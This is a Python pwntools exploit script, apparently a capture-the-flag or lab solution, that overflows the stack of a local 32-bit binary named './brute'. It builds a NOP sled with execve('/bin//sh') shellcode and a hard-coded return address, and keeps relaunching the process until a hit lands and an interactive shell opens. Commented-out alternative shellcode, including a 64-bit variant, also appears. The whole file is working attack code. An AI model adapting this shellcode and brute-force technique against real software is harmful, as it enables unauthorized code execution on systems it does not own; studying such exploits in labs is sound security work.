import sys
from pwn import *

context.update(os='linux',arch='i386')
#p = process('./brute')
#p.sendline(cyclic(20000))
#p.wait()

#core = p.corefile

offset = 16392 #cyclic_find(core.read(core.esp,4))

#payload = b"\xcc\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
#payload = b"\xcc\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
payload = b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90"
            
retaddr = 0xffda7604

exploit = flat({
    0x0: asm("nop")*(offset-len(payload)),
    offset-len(payload): payload + p32(retaddr),
    })

#sys.stderr.buffer.write(exploit)
i = 0
while True:
    with context.silent:
        p = process('./brute')
        p.sendline(exploit)
    
        res = ""
        try:
            res = p.recvall()
        except EOFError:
            print("piss")
        print(f"attempt {i}, hit{str(res)}") 
        if str(retaddr) in str(res):
            p.interactive()

        i +=1
